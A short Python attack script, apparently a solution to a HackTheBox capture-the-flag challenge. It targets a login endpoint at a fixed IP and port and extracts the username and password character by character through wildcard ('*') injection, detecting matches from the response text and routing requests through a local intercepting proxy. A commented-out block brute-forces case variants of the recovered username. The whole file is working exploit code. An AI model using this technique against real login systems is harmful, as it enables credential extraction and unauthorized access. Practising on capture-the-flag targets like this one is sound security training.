import requests
import string

with open('/usr/share/wordlists/SecLists/Fuzzing/special-chars.txt', 'r') as f:
	spec = f.read().replace('\n','')
lst = list(string.ascii_letters)+list('0123456789')+list(spec)
url = 'http://178.62.91.197:31920/login'
my_data = {'username': 'foo', 'password':'*'}
lst.remove('*')
def brute_force(searched):
	result = ''
	h = True
	while h == True:
		h = False
		for k in lst:
			my_data[searched] = result + k + '*'
			r = requests.post(url, data=my_data, proxies= {'http': 'http://127.0.0.1:8080'})
			if 'No search result' in r.text:
				h = True
				result += k
				break
	print('The correct {} is: '.format(searched), result)
	return result
				
my_data['username'] = brute_force('username') #reese e=E (5^2)
brute_force('password') #HTB
#my_data = {'username': 'reese','password': 'HTB'}
#send_data = set()
#for i in range(len(my_data['username'])):
#	for k in range (i,len(my_data['username'])):
#		send_data.add(my_data['username'][:k] + my_data['username'][k].upper()+my_data['username'][k+1:])
#		send_data.add(my_data['username'][:k] + my_data['username'][k].lower()+my_data['username'][k+1:].upper())
#
#	my_data['username'] = my_data['username'][:i] + my_data['username'][i].upper()+my_data['username'][i+1:]
#
#for i in send_data:
#	my_data['username'] = i
#	r = requests.post(url, data=my_data, proxies= {'http': 'http://127.0.0.1:8080'})
#
#	if 'HTB' in r.text:
#		print(my_data)
#
#
#
#
 